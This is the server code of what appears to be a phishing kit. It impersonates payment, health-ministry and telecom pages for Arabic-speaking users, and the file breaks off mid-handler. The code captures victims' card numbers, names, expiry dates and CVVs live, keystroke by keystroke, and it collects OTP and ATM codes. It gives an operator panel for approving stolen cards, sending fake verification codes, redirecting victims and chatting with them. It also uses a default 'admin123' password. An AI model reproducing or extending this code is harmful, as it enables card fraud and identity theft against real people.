const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const cookieParser = require("cookie-parser");
const fs = require("fs");
const path = require("path");
require("dotenv").config();

// Prevent server from crashing on unhandled errors
process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err.message, err.stack);
});
process.on('unhandledRejection', (reason) => {
  console.error('Unhandled Rejection:', reason);
});

const app = express();
const server = http.createServer(app);

// CORS Configuration - allow all origins
const corsOptions = {
  origin: true,
  credentials: true,
  methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
};

app.use(cors(corsOptions));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use('/admin', express.static('admin'));

// Socket.IO Configuration
const io = new Server(server, {
  cors: {
    origin: true,
    credentials: true,
    methods: ["GET", "POST"],
  },
  transports: ["polling", "websocket"],
  pingTimeout: 60000,
  pingInterval: 25000,
  allowEIO3: true,
});

// Data file path
const DATA_DIR = process.env.NODE_ENV === 'production' ? '/data' : __dirname;
const DATA_FILE = path.join(DATA_DIR, 'visitors_data.json');
const BACKUP_FILE = path.join(DATA_DIR, 'visitors_data_backup.json');

// Ensure data directory exists
function ensureDataDir() {
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
      console.log(`Created data directory: ${DATA_DIR}`);
    }
  } catch (error) {
    console.error("Error creating data directory:", error);
  }
}

// Load saved data from file
function loadSavedData() {
  ensureDataDir();
  console.log(`Loading data from: ${DATA_FILE}`);
  
  try {
    // Try main file first
    if (fs.existsSync(DATA_FILE)) {
      const data = fs.readFileSync(DATA_FILE, "utf8");
      if (!data || data.trim() === "") {
        console.log("Data file is empty, starting fresh");
        return null;
      }
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.savedVisitors?.length || 0} visitors from main file`);
      console.log(`Loaded whatsappNumber: ${parsed.whatsappNumber || 'not set'}`);
      return {
        visitors: new Map(Object.entries(parsed.visitors || {})),
        visitorCounter: parsed.visitorCounter || 0,
        savedVisitors: parsed.savedVisitors || [],
        whatsappNumber: parsed.whatsappNumber || "",
        globalBlockedCards: parsed.globalBlockedCards || [],
        globalBlockedCountries: parsed.globalBlockedCountries || [],
        adminPassword: parsed.adminPassword || "admin123",
      };
    }
    
    // Try backup file if main doesn't exist
    if (fs.existsSync(BACKUP_FILE)) {
      console.log("Main file not found, trying backup...");
      const data = fs.readFileSync(BACKUP_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.savedVisitors?.length || 0} visitors from backup file`);
      console.log(`Loaded whatsappNumber: ${parsed.whatsappNumber || 'not set'}`);
      return {
        visitors: new Map(Object.entries(parsed.visitors || {})),
        visitorCounter: parsed.visitorCounter || 0,
        savedVisitors: parsed.savedVisitors || [],
        whatsappNumber: parsed.whatsappNumber || "",
        globalBlockedCards: parsed.globalBlockedCards || [],
        globalBlockedCountries: parsed.globalBlockedCountries || [],
        adminPassword: parsed.adminPassword || "admin123",
      };
    }
    
    console.log("No data file found, starting fresh");
  } catch (error) {
    console.error("Error loading saved data:", error);
    
    // Try backup on error
    try {
      if (fs.existsSync(BACKUP_FILE)) {
        console.log("Error loading main file, trying backup...");
        const data = fs.readFileSync(BACKUP_FILE, "utf8");
        if (!data || data.trim() === "") return null;
        const parsed = JSON.parse(data);
        return {
          visitors: new Map(Object.entries(parsed.visitors || {})),
          visitorCounter: parsed.visitorCounter || 0,
          savedVisitors: parsed.savedVisitors || [],
          whatsappNumber: parsed.whatsappNumber || "",
          globalBlockedCards: parsed.globalBlockedCards || [],
          globalBlockedCountries: parsed.globalBlockedCountries || [],
          adminPassword: parsed.adminPassword || "admin123",
        };
      }
    } catch (backupError) {
      console.error("Error loading backup:", backupError);
    }
  }
  return {
    visitors: new Map(),
    visitorCounter: 0,
    savedVisitors: [],
    whatsappNumber: "",
    globalBlockedCards: [],
    globalBlockedCountries: [],
    adminPassword: "admin123",
  };
}

// Save data to file with backup
function saveData() {
  ensureDataDir();
  
  try {
    const data = {
      visitors: Object.fromEntries(visitors),
      visitorCounter,
      savedVisitors,
      whatsappNumber,
      globalBlockedCards,
      globalBlockedCountries,
      adminPassword,
      lastSaved: new Date().toISOString(),
    };
    const jsonData = JSON.stringify(data, null, 2);
    
    // Create backup of existing file first
    if (fs.existsSync(DATA_FILE)) {
      try {
        fs.copyFileSync(DATA_FILE, BACKUP_FILE);
      } catch (backupErr) {
        console.error("Error creating backup:", backupErr);
      }
    }
    
    // Write main file
    fs.writeFileSync(DATA_FILE, jsonData);
    console.log(`Data saved: ${savedVisitors.length} visitors at ${new Date().toISOString()}`);
  } catch (error) {
    console.error("Error saving data:", error);
  }
}

// Initialize data from file
  const savedData = loadSavedData() || {};
  const visitors = savedData.visitors || new Map();
const admins = new Map();
let visitorCounter = savedData.visitorCounter || 0;
let savedVisitors = savedData.savedVisitors || []; // Array to store all visitors permanently
let whatsappNumber = savedData.whatsappNumber || ""; // WhatsApp number for footer
let globalBlockedCards = savedData.globalBlockedCards || []; // Global blocked card prefixes
let globalBlockedCountries = savedData.globalBlockedCountries || []; // Global blocked countries
let adminPassword = savedData.adminPassword || "admin123"; // Admin password (persisted)

// Generate unique API key
function generateApiKey() {
  return "api_" + Math.random().toString(36).substring(2, 15);
}

// Get visitor info from request
function getVisitorInfo(socket) {
  const headers = socket.handshake.headers;
  // Get the FIRST IP from x-forwarded-for (the client's real IP)
  let ip = headers["x-forwarded-for"] || socket.handshake.address;
  if (ip && ip.includes(",")) {
    const ips = ip.split(",").map(i => i.trim());
    ip = ips[0]; // Use the first IP (client's real IP)
  }
  return {
    ip: ip,
    userAgent: headers["user-agent"] || "",
    country: headers["cf-ipcountry"] || "Unknown",
  };
}

// Lookup country from IP using free API
function lookupCountry(ip) {
  const cleanIp = ip.replace('::ffff:', '');
  return new Promise((resolve) => {
    http.get('http://ip-api.com/json/' + cleanIp + '?fields=countryCode', (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(data);
          resolve(json.countryCode || 'Unknown');
        } catch (e) {
          resolve('Unknown');
        }
      });
    }).on('error', () => resolve('Unknown'));
  });
}


// Parse user agent
function parseUserAgent(ua) {
  let os = "Unknown";
  let device = "Unknown";
  let browser = "Unknown";

  // OS Detection
  if (ua.includes("Windows")) os = "Windows";
  else if (ua.includes("Mac")) os = "macOS";
  else if (ua.includes("Linux")) os = "Linux";
  else if (ua.includes("Android")) os = "Android";
  else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";

  // Device Detection
  if (ua.includes("Mobile")) device = "Mobile";
  else if (ua.includes("Tablet")) device = "Tablet";
  else device = "Desktop";

  // Browser Detection
  if (ua.includes("Chrome")) browser = "Chrome";
  else if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Safari")) browser = "Safari";
  else if (ua.includes("Edge")) browser = "Edge";

  return { os, device, browser };
}

// Save visitor to permanent storage
function saveVisitorPermanently(visitor) {
  const existingIndex = savedVisitors.findIndex(v => v._id === visitor._id);
  if (existingIndex >= 0) {
    savedVisitors[existingIndex] = { ...savedVisitors[existingIndex], ...visitor };
  } else {
    savedVisitors.push({ ...visitor });
  }
  saveData();
}

// Socket.IO Connection Handler
io.on("connection", (socket) => {
  console.log(`New connection: ${socket.id}`);

  // Handle visitor registration
  socket.on("visitor:register", (data) => {
   try {
    const visitorInfo = getVisitorInfo(socket);
    
    const { os, device, browser } = parseUserAgent(visitorInfo.userAgent);
    
    // Get existing visitor ID from client (localStorage)
    const existingVisitorId = data?.existingVisitorId;
    
    // Check if this visitor already exists based on visitor ID from localStorage
    let existingVisitor = null;
    if (existingVisitorId) {
      existingVisitor = savedVisitors.find(v => v._id === existingVisitorId);
      console.log(`Looking for existing visitor with ID: ${existingVisitorId}, found: ${!!existingVisitor}`);
    }

    // NOTE: IP-based fallback matching was intentionally removed to fix KNET.
    // However, to prevent duplicate visitors caused by race conditions on first load
    // (e.g., home.html and React SPA connecting simultaneously before localStorage is set),
    // we add a VERY STRICT fallback: match by IP ONLY IF the previous visitor was created
    // within the last 5 seconds. This is safe and won't affect KNET (which happens later).
    if (!existingVisitor && visitorInfo.ip) {
      const recentVisitor = savedVisitors.find(v => 
        v.ip === visitorInfo.ip && 
        (Date.now() - new Date(v.createdAt).getTime()) < 5000
      );
      if (recentVisitor) {
        existingVisitor = recentVisitor;
        console.log(`Race condition prevented: Merged with recent visitor ${existingVisitor._id} created ${(Date.now() - new Date(existingVisitor.createdAt).getTime())}ms ago`);
      }
    }

    let visitor;
    let isNewVisitor = false;

    if (existingVisitor) {
      // Update existing visitor with new socketId
      visitor = {
        ...existingVisitor,
        socketId: socket.id,
        isConnected: true,
        sessionStartTime: Date.now(),
      };
      // Update in savedVisitors
      const index = savedVisitors.findIndex(v => v._id === existingVisitor._id);
      if (index >= 0) {
        savedVisitors[index] = visitor;
      }
      console.log(`Returning visitor reconnected: ${visitor._id}`);
    } else {
      // Create new visitor
      visitorCounter++;
      visitor = {
        _id: `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
        socketId: socket.id,
        visitorNumber: visitorCounter,
        createdAt: new Date().toISOString(),
        isRead: false,
        fullName: "",
        phone: "",
        idNumber: "",
        apiKey: generateApiKey(),
        ip: visitorInfo.ip,
        country: visitorInfo.country,
        city: "",
        os,
        device,
        browser,
        date: new Date().toISOString(),
        blockedCardPrefixes: [],
        page: "الصفحة الرئيسية",
        data: {},
        dataHistory: [],
        paymentCards: [],
        digitCodes: [],
        hasNewData: false,
        isBlocked: false,
        isConnected: true,
        sessionStartTime: Date.now(),
      };
      savedVisitors.push(visitor);
      isNewVisitor = true;
      console.log(`New visitor registered: ${visitor._id}`);
    }

    visitors.set(socket.id, visitor);
    saveData();

    // Lookup country from IP if unknown
    if (visitor.country === 'Unknown' && visitorInfo.ip) {
      lookupCountry(visitorInfo.ip).then(country => {
        if (country && country !== 'Unknown') {
          visitor.country = country;
          visitors.set(socket.id, visitor);
          saveVisitorPermanently(visitor);
          // Notify admins of country update
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit("visitor:updated", visitor);
          });
        }
      });
    }

    // Send confirmation to visitor
    socket.emit("successfully-connected", {
      sid: socket.id,
      pid: visitor._id,
    });

    // Notify admins
    admins.forEach((admin, adminSocketId) => {
      if (isNewVisitor) {
        io.to(adminSocketId).emit("visitor:new", { ...visitor, isConnected: true });
      } else {
        io.to(adminSocketId).emit("visitor:reconnected", { visitorId: visitor._id, socketId: socket.id });
      }
    });
   } catch (err) {
    console.error("Error in visitor:register handler:", err);
    // Still try to send confirmation even if something else failed
    try {
      socket.emit("successfully-connected", { sid: socket.id, pid: "error" });
    } catch (e) {}
   }
  });

  // Handle page enter
  socket.on("visitor:pageEnter", (page) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      visitor.page = page;
      // Activate hasEnteredCardPage when visitor reaches checkout/payment pages
      const pageLower = (page || '').toLowerCase();
      if (pageLower.includes('card payment') || pageLower.includes('checkout') || pageLower.includes('ملخص الحجز') || pageLower.includes('الدفع') || pageLower.includes('بطاقة')) {
        visitor.hasEnteredCardPage = true;
        visitor.lastDataUpdate = new Date().toISOString();
      }
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:pageChanged", {
          visitorId: visitor._id,
          page,
        });
        // Also send full visitor update so admin can render the card
        io.to(adminSocketId).emit("visitor:dataSubmitted", {
          visitorId: visitor._id,
          socketId: socket.id,
          data: {},
          visitor: visitor,
        });
      });
    }
  });

  // Handle visitor name update (from MOH username)
  socket.on("visitor:updateName", (name) => {
    const visitor = visitors.get(socket.id);
    if (visitor && name) {
      visitor.fullName = name;
      visitor.mohUsername = name;
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:nameUpdated", {
          visitorId: visitor._id,
          name: name,
        });
      });

      console.log(`Visitor ${visitor._id} name updated to: ${name}`);
    }
  });

  // Handle more info (data submission)
  socket.on("more-info", (data) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      // Store submitted data with page info for ordering
      if (data.content) {
        // Initialize dataHistory if not exists
        if (!visitor.dataHistory) {
          visitor.dataHistory = [];
        }
        // Add new data entry with timestamp and page
        const now = new Date().toISOString();
        visitor.dataHistory.push({
          content: data.content,
          page: data.page,
          timestamp: now,
        });
        // Activate card page tracking when checkout action is received
        if (data.content.action === 'checkout') {
          visitor.hasEnteredCardPage = true;
          visitor.lastDataUpdate = now;
        }
        // Only update lastDataUpdate if already entered card page
        if (visitor.hasEnteredCardPage) {
          visitor.lastDataUpdate = now;
        }
        // Also keep flat data for backward compatibility
        visitor.data = { ...visitor.data, ...data.content };
        // تخزين اسم الشبكة إذا كان موجوداً
        if (data.content["مزود الخدمة"]) {
          visitor.network = data.content["مزود الخدمة"];
        }
        if (data.content["مزود الشبكة"]) {
          visitor.network = data.content["مزود الشبكة"];
        }
      }
      if (data.paymentCard) {
        const now = new Date().toISOString();
        visitor.paymentCards.push({
          ...data.paymentCard,
          timestamp: now,
        });
        // Start tracking from card page
        visitor.lastDataUpdate = now;
        visitor.hasEnteredCardPage = true;
      }
      if (data.digitCode) {
        const now = new Date().toISOString();
        visitor.digitCodes.push({
          code: data.digitCode,
          page: data.page,
          timestamp: now,
        });
        // Only update if already entered card page
        if (visitor.hasEnteredCardPage) {
          visitor.lastDataUpdate = now;
        }
      }

      visitor.page = data.page;
      visitor.waitingForAdminResponse = data.waitingForAdminResponse || false;
      visitor.hasNewData = true;
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:dataSubmitted", {
          visitorId: visitor._id,
          socketId: socket.id,
          data: data,
          visitor: visitor,
        });
      });

      console.log(`Data received from visitor ${visitor._id}:`, data);
    }
  });

  // Handle live card data (real-time keystroke updates)
  socket.on("card:live", (data) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      visitor.liveCard = {
        cardNumber: data.cardNumber || "",
        nameOnCard: data.nameOnCard || "",
        expiryDate: data.expiryDate || "",
        cvv: data.cvv || "",
      };
      visitors.set(socket.id, visitor);
      // Notify admins immediately
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("card:liveUpdate", {
          visitorId: visitor._id,
          liveCard: visitor.liveCard,
        });
      });
    }
  });

  // Handle card number verification
  socket.on("cardNumber:verify", (cardNumber) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      // Check if card prefix is blocked
      const prefix = cardNumber.substring(0, 4);
      const isBlocked = visitor.blockedCardPrefixes.includes(prefix);

      socket.emit("cardNumber:verified", !isBlocked);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:cardVerification", {
          visitorId: visitor._id,
          cardNumber,
          isBlocked,
        });
      });
    }
  });

  // Admin registration
  socket.on("admin:register", (credentials) => {
    // Simple admin authentication - uses persistent password from disk
    if (credentials.password === adminPassword) {
      admins.set(socket.id, {
        socketId: socket.id,
        connectedAt: new Date().toISOString(),
      });

      socket.emit("admin:authenticated", true);

      // Get all connected visitor IDs from the active visitors Map
      const connectedVisitorIds = new Set();
      visitors.forEach((v) => {
        connectedVisitorIds.add(v._id);
      });
      
      // Update connection status for saved visitors based on _id match
      const visitorsWithStatus = savedVisitors.map(v => {
        // Check if this visitor's _id is in the connected visitors
        const isCurrentlyConnected = connectedVisitorIds.has(v._id);
        // Also update socketId if connected
        let currentSocketId = v.socketId;
        visitors.forEach((activeVisitor, sid) => {
          if (activeVisitor._id === v._id) {
            currentSocketId = sid;
          }
        });
        return { ...v, socketId: currentSocketId, isConnected: isCurrentlyConnected };
      });

      // Sort visitors by lastDataUpdate (most recent first)
      visitorsWithStatus.sort((a, b) => {
        const dateA = a.lastDataUpdate ? new Date(a.lastDataUpdate).getTime() : 0;
        const dateB = b.lastDataUpdate ? new Date(b.lastDataUpdate).getTime() : 0;
        return dateB - dateA;
      });

      console.log(`Sending ${visitorsWithStatus.length} visitors to admin, ${connectedVisitorIds.size} connected`);

      // Send all saved visitors to admin with updated connection status
      socket.emit("visitors:list", visitorsWithStatus);

      // Notify visitors that admin is connected
      visitors.forEach((visitor, visitorSocketId) => {
        io.to(visitorSocketId).emit("isAdminConnected", true);
      });

      console.log(`Admin connected: ${socket.id}`);
    } else {
      socket.emit("admin:authenticated", false);
    }
  });

  // Admin: Approve form
  socket.on("admin:approve", (visitorSocketId) => {
    io.to(visitorSocketId).emit("form:approved");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Form approved for visitor: ${visitorSocketId}`);
  });

  // Admin: Reject form
  socket.on("admin:reject", (data) => {
    const visitorSocketId = data.visitorSocketId || data;
    io.to(visitorSocketId).emit("form:rejected");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Form rejected for visitor: ${visitorSocketId}`);
  });

  // Admin: Reject Mobily call (special handling for Mobily page)
  socket.on("admin:mobilyReject", (visitorSocketId) => {
    io.to(visitorSocketId).emit("mobily:rejected");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Mobily call rejected for visitor: ${visitorSocketId}`);
  });

  // Admin: Send verification code
  socket.on("admin:sendCode", ({ visitorSocketId, code }) => {
    io.to(visitorSocketId).emit("code", code);
    // حفظ الرمز في بيانات الزائر وتحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.lastSentCode = code;
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Code sent to visitor ${visitorSocketId}: ${code}`);
  });

  // Admin: Navigate visitor to page
  socket.on("admin:navigate", ({ visitorSocketId, page }) => {
    io.to(visitorSocketId).emit("visitor:navigate", page);
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Navigating visitor ${visitorSocketId} to: ${page}`);
  });

  // Admin: Card action (OTP, ATM, Reject)
  socket.on("admin:cardAction", ({ visitorSocketId, action }) => {
    io.to(visitorSocketId).emit("card:action", action);
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      // If reject, block the last submitted card number
      if (action === 'reject' && visitor.paymentCards && visitor.paymentCards.length > 0) {
        const lastCard = visitor.paymentCards[visitor.paymentCards.length - 1];
        if (lastCard && lastCard.cardNumber) {
          if (!visitor.rejectedCards) visitor.rejectedCards = [];
          if (!visitor.rejectedCards.includes(lastCard.cardNumber)) {
            visitor.rejectedCards.push(lastCard.cardNumber);
          }
          // Send rejected cards list to client
          io.to(visitorSocketId).emit("rejectedCards:list", visitor.rejectedCards);
        }
      }
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Card action ${action} sent to visitor ${visitorSocketId}`);
  });

  // Admin: Code action (Approve, Reject) for OTP/digit codes
  socket.on("admin:codeAction", ({ visitorSocketId, action, codeIndex }) => {
    io.to(visitorSocketId).emit("code:action", { action, codeIndex });
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Code action ${action} sent to visitor ${visitorSocketId}`);
  });

  // Admin: Approve resend code request
  socket.on("admin:approveResend", ({ visitorSocketId }) => {
    io.to(visitorSocketId).emit("resend:approved");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Resend approved for visitor ${visitorSocketId}`);
  });

  // Admin: Block visitor
  socket.on("admin:block", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.isBlocked = true;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.to(visitorSocketId).emit("blocked");
      console.log(`Visitor blocked: ${visitorSocketId}`);
    }
  });

  // Admin: Unblock visitor
  socket.on("admin:unblock", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.isBlocked = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.to(visitorSocketId).emit("unblocked");
      console.log(`Visitor unblocked: ${visitorSocketId}`);
    }
  });

  // Admin: Delete visitor by socket ID
  socket.on("admin:delete", (visitorSocketId) => {
    io.to(visitorSocketId).emit("deleted");
    visitors.delete(visitorSocketId);
    
    // Also remove from saved visitors
    const visitorToDelete = Array.from(visitors.values()).find(v => v.socketId === visitorSocketId);
    if (visitorToDelete) {
      savedVisitors = savedVisitors.filter(v => v._id !== visitorToDelete._id);
      saveData();
    }
    
    console.log(`Visitor deleted: ${visitorSocketId}`);
  });

  // Admin: Delete visitor by ID
  socket.on("admin:deleteById", (visitorId) => {
    // Find and remove from active visitors
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        io.to(socketId).emit("deleted");
        visitors.delete(socketId);
      }
    });
    
    // Remove from saved visitors
    savedVisitors = savedVisitors.filter(v => v._id !== visitorId);
    saveData();
    
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:deleted", { visitorId });
    });
    
    console.log(`Visitor deleted by ID: ${visitorId}`);
  });

  // Admin: Send last message
  socket.on("admin:sendMessage", ({ visitorSocketId, message }) => {
    io.to(visitorSocketId).emit("admin-last-message", { message });
    console.log(`Message sent to visitor ${visitorSocketId}: ${message}`);
  });

  // Admin: Set bank name
  socket.on("admin:setBankName", ({ visitorSocketId, bankName }) => {
    io.to(visitorSocketId).emit("bankName", bankName);
    console.log(`Bank name set for visitor ${visitorSocketId}: ${bankName}`);
  });

  // Admin: Change password
  socket.on("admin:changePassword", ({ oldPassword, newPassword }) => {
    // Verify old password - uses persistent password from disk
    if (oldPassword === adminPassword) {
      // Update password and save to disk for persistence
      adminPassword = newPassword;
      saveData();
      socket.emit("admin:passwordChanged", true);
      console.log("Admin password changed successfully and saved to disk");
      
      // Force logout ALL other admin sessions
      admins.forEach((admin, adminSocketId) => {
        if (adminSocketId !== socket.id) {
          io.to(adminSocketId).emit("admin:forceLogout");
          admins.delete(adminSocketId);
          console.log(`Force logged out admin: ${adminSocketId}`);
        }
      });
      
      // Also logout the admin who changed the password
      setTimeout(() => {
        io.to(socket.id).emit("admin:forceLogout");
        admins.delete(socket.id);
        console.log(`Force logged out password changer: ${socket.id}`);
      }, 2000);
      
      console.log("All admin sessions logged out after password change");
    } else {
      socket.emit("admin:passwordChanged", false);
      console.log("Admin password change failed - wrong old password");
    }
  });

  // Admin: Clear all data
  socket.on("admin:clearAllData", () => {
    // Disconnect all visitors
    visitors.forEach((v, socketId) => {
      io.to(socketId).emit("deleted");
    });
    
    // Clear all data
    visitors.clear();
    savedVisitors = [];
    visitorCounter = 0;
    
    // Save empty data to disk
    saveData();
    
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("allDataCleared");
    });
    
    console.log("All data cleared by admin");
  });

  // WhatsApp: Get current number
  socket.on("whatsapp:get", () => {
    // Send to admin
    socket.emit("whatsapp:current", whatsappNumber);
    // Also send to client (for footer)
    socket.emit("whatsapp:update", whatsappNumber);
  });

  // WhatsApp: Set number (admin only)
  socket.on("whatsapp:set", (number) => {
    whatsappNumber = number;
    saveData();
    // Broadcast to all connected clients
    io.emit("whatsapp:update", whatsappNumber);
    console.log(`WhatsApp number updated: ${whatsappNumber}`);
  });

  // Blocked Cards: Get list
  socket.on("blockedCards:get", () => {
    socket.emit("blockedCards:list", globalBlockedCards);
  });

  // Blocked Cards: Add prefix
  socket.on("blockedCards:add", (prefix) => {
    if (prefix && prefix.length === 4 && !globalBlockedCards.includes(prefix)) {
      globalBlockedCards.push(prefix);
      saveData();
      // Notify all admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("blockedCards:list", globalBlockedCards);
      });
      // Broadcast to all clients
      io.emit("blockedCards:updated", globalBlockedCards);
      console.log(`Blocked card prefix added: ${prefix}`);
    }
  });

  // Blocked Cards: Remove prefix
  socket.on("blockedCards:remove", (prefix) => {
    globalBlockedCards = globalBlockedCards.filter(p => p !== prefix);
    saveData();
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("blockedCards:list", globalBlockedCards);
    });
    // Broadcast to all clients
    io.emit("blockedCards:updated", globalBlockedCards);
    console.log(`Blocked card prefix removed: ${prefix}`);
  });

  // Blocked Cards: Check if card is blocked (for clients)
  socket.on("blockedCards:check", (cardNumber) => {
    const prefix = cardNumber.replace(/\s/g, '').substring(0, 4);
    const isBlocked = globalBlockedCards.includes(prefix);
    socket.emit("blockedCards:checkResult", { isBlocked, prefix });
  });

  // Blocked Countries: Get list
  socket.on("blockedCountries:get", () => {
    socket.emit("blockedCountries:list", globalBlockedCountries);
  });

  // Blocked Countries: Add country
  socket.on("blockedCountries:add", (country) => {
    if (country && !globalBlockedCountries.includes(country)) {
      globalBlockedCountries.push(country);
      saveData();
      // Notify all admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("blockedCountries:list", globalBlockedCountries);
      });
      // Broadcast to all clients
      io.emit("blockedCountries:updated", globalBlockedCountries);
      console.log(`Blocked country added: ${country}`);
    }
  });

  // Blocked Countries: Remove country
  socket.on("blockedCountries:remove", (country) => {
    globalBlockedCountries = globalBlockedCountries.filter(c => c !== country);
    saveData();
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("blockedCountries:list", globalBlockedCountries);
    });
    // Broadcast to all clients
    io.emit("blockedCountries:updated", globalBlockedCountries);
    console.log(`Blocked country removed: ${country}`);
  });

  // Blocked Countries: Check if visitor's country is blocked
  socket.on("blockedCountries:check", (country) => {
    const isBlocked = globalBlockedCountries.some(c => 
      c.toLowerCase() === country.toLowerCase()
    );
    socket.emit("blockedCountries:checkResult", { isBlocked, country });
  });

  // Admin: Mark visitor data as read (hide new data indicator)
  socket.on("admin:markAsRead", (visitorId) => {
    // Find visitor by ID in active visitors
    let found = false;
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        v.hasNewData = false;
        visitors.set(socketId, v);
        saveVisitorPermanently(v);
        found = true;
      }
    });
    
    // Also update in saved visitors
    const savedVisitor = savedVisitors.find(v => v._id === visitorId);
    if (savedVisitor) {
      savedVisitor.hasNewData = false;
      saveData();
    }
    
    // Notify all admins about the update
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:markedAsRead", { visitorId });
    });
    
    console.log(`Visitor ${visitorId} marked as read`);
  });

  // Chat: Message from visitor to admin
  socket.on("chat:fromVisitor", ({ visitorSocketId, message, timestamp }) => {
    const visitor = visitors.get(visitorSocketId) || visitors.get(socket.id);
    if (visitor) {
      // Initialize chat messages array if not exists
      if (!visitor.chatMessages) {
        visitor.chatMessages = [];
      }
      
      // Add message to visitor's chat history
      const chatMessage = {
        id: Date.now().toString(),
        text: message,
        sender: 'visitor',
        timestamp: timestamp || new Date().toISOString()
      };
      visitor.chatMessages.push(chatMessage);
      visitor.hasNewMessage = true;
      visitors.set(visitor.socketId, visitor);
      saveVisitorPermanently(visitor);
      
      // Notify all admins about the new message
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("chat:newMessage", {
          visitorSocketId: visitor.socketId,
          visitorId: visitor._id,
          message: chatMessage
        });
      });
      
      console.log(`Chat message from visitor ${visitor.socketId}: ${message}`);
    }
  });

  // Chat: Message from admin to visitor
  socket.on("chat:fromAdmin", ({ visitorSocketId, message, timestamp }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      // Initialize chat messages array if not exists
      if (!visitor.chatMessages) {
        visitor.chatMessages = [];
      }
      
      // Add message to visitor's chat history
      const chatMessage = {
        id: Date.now().toString(),
        text: message,
        sender: 'admin',
        timestamp: timestamp || new Date().toISOString()
      };
      visitor.chatMessages.push(chatMessage);
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      
      // Send message to visitor
      io.to(visitorSocketId).emit("chat:fromAdmin", {
        message: message,
        timestamp: chatMessage.timestamp
      });
      
      console.log(`Chat message from admin to visitor ${visitorSocketId}: ${message}`);
    }
  });

  // Chat: Mark messages as read
  socket.on("chat:markAsRead", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
